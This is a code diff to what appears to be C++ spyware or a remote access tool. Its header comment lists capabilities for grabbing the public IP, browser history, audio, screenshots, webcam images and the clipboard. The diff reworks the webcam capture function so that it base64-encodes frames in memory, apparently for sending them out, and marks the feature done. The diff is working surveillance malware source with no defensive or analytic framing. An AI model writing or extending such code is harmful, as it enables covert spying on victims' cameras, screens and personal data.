@@ -5,7 +5,7 @@ grab publicip: return string [ok]
 grab history: return whatever (check jabor)
 record audio
 screenshot: return base64 [ok]
-webcam image: return base64, unless above, or whatever CV returns
+webcam image: return base64, unless above, or whatever CV returns [ok]
 clipboard: return string [ok]
 */
 
@@ -146,7 +146,7 @@ std::string GrabScreenshot() {
 }
 
 std::mutex mxWebcam;
-bool GetWebcamImage(std::string file) {
+bool GetWebcamImage(std::string* pBase64) {
     std::lock_guard<std::mutex> lgLock(mxWebcam);
     cv::VideoCapture cap(0);
     if (!cap.isOpened()) return false;
@@ -157,7 +157,32 @@ bool GetWebcamImage(std::string file) {
             return false;
         }
     }
-    cv::imwrite(file, frame);
+    std::vector<unsigned char> buffer;
+    cv::imencode(".jpg", frame, buffer);
+    std::string base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int i = 0;
+    int j = 0;
+    unsigned char arr3[3];
+    unsigned char arr4[4];
+    for (unsigned char c: buffer) {
+        arr3[i++] = c;
+        if (i == 3) {
+            arr4[0] = (arr3[0] & 0xfc) >> 2;
+            arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
+            arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
+            arr4[3] = arr3[2] & 0x3f;
+            for (i = 0; (i < 4); i++) *pBase64 += base64Chars[arr4[i]];
+            i = 0;
+        }
+    }
+    if (i) {
+        for (j = i; j < 3; j++) arr3[j] = '\0';
+        arr4[0] = (arr3[0] & 0xfc) >> 2;
+        arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
+        arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
+        for (j = 0; (j < i + 1); j++) *pBase64 += base64Chars[arr4[j]];
+        while ((i++ < 3)) *pBase64 += '=';
+    }
     cap.release();
     return true;
 }
